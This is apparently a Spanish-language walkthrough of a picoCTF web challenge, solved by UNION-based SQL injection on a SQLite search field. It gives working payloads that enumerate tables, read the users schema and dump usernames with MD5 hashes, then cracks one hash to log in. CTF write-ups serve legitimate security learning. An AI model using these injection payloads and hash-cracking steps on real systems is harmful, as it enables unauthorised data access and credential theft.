# Descripción
You’ve been hired by a shadowy group of pentesters who love a good puzzle. The system looks ordinary, but appearances lie. Somewhere inside, sloppy code and legacy hashing practices left a tiny, perfect doorway for an attacker.Your mission — should you choose to accept it — is to slip through that doorway, act as a legit user and retrieve the secret flag.

Login [here](http://lonely-island.picoctf.net:64597/) and find the flag!

# Solución
Ingresamos a la pagina web y nos registramos con cualquier usuario y contraseña, una vez adentro hay un buscador que nos permite buscar flags, pero todas las que aparecen son falsas, primero observamos con una inyeccion las tablas que existen: 

```
' UNION SELECT name,2 FROM sqlite_master WHERE type='table' --
```

Ahí observamos algunas tablas, pero sobretodo observamos que existe una tabla llamada users, observamos su estructura:

```
' UNION SELECT sql,2 FROM sqlite_master WHERE name='users' --
```

Obtenemos el create table de users y vemos que cuenta con 2 columnas, la de password y la de username, a sabiendas de esto obtenemos ambos registros de todos los usuarios:

```
' UNION SELECT username,password FROM users --
```

Obtenemos la contraseña de todos los usuarios que estan encryptadas en md5, las tomamos y nos vamos a una pagina web como crackstation y las desencriptamos:

```
- `ghost`: `8d2379c40704bed972e55680be2355e2`
- `malicious`: `a669d60c31ad3d05b9e453c8576c7aab`
- `noaccess`: `83806b490e28a7f8e6662646cbdbff1a`
- `suspicious`: `eb1f3ba6901c65d9b2e09a38f560758b`
- `ctf-player`: `7a67ab5872843b22b5e14511867c4e43`
```

La única en desencriptarse fue la de ctf-player, nos logueamos con su contraseña "dyesebel".

y encontramos la flag:

picoCTF{F0uNd_s3cr3T_K3y_f0R_w3_<>}
# Notas adicionales
- 
# Referencias
- https://crackstation.net/